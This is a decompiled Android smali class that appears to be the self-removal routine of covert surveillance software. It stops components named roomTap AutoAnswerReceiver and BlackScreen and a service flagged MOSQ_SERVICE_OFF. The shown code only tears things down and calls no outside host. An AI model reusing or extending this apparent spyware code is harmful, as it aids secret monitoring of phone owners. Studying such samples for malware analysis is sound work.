.class final Lcom/network/h/c;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/network/h/c;->a:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 4

    const/4 v3, 0x0

    :try_start_0
    invoke-static {}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/network/h/c;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->b(Landroid/content/Context;)V

    :cond_0
    iget-object v0, p0, Lcom/network/h/c;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/a/c;->c(Landroid/content/Context;)V

    invoke-static {}, Lcom/network/android/a/b;->a()V

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    const-string v1, "NetworkPreferences"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iget-object v1, p0, Lcom/network/h/c;->a:Landroid/content/Context;

    invoke-static {v1, v0}, Lcom/network/android/roomTap/BlackScreen;->a(Landroid/content/Context;Landroid/content/SharedPreferences;)V

    sget-object v0, Lcom/network/media/CoreReceiver;->a:Lcom/network/f/a;

    if-eqz v0, :cond_1

    sget-object v0, Lcom/network/media/CoreReceiver;->a:Lcom/network/f/a;

    invoke-virtual {v0}, Lcom/network/f/a;->a()V

    :cond_1
    invoke-static {}, Lcom/network/i/b;->a()Lcom/network/i/b;

    move-result-object v0

    iget-object v1, p0, Lcom/network/h/c;->a:Landroid/content/Context;

    invoke-virtual {v0, v1}, Lcom/network/i/b;->a(Landroid/content/Context;)V

    invoke-static {}, Lcom/network/d/a;->a()V

    const/4 v0, 0x2

    const/16 v1, 0x71

    const-string v2, "MOSQ_SERVICE_OFF"

    invoke-static {v0, v1, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    iget-object v0, p0, Lcom/network/h/c;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/b/b;->b(Landroid/content/Context;)V

    iget-object v0, p0, Lcom/network/h/c;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/h/b;->e(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    :try_start_1
    iget-object v0, p0, Lcom/network/h/c;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/h/b;->e(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    :goto_1
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "removeAppalication: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    :catch_1
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "removeAppalication: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    sput-boolean v3, Lcom/network/h/b;->a:Z

    goto :goto_1
.end method
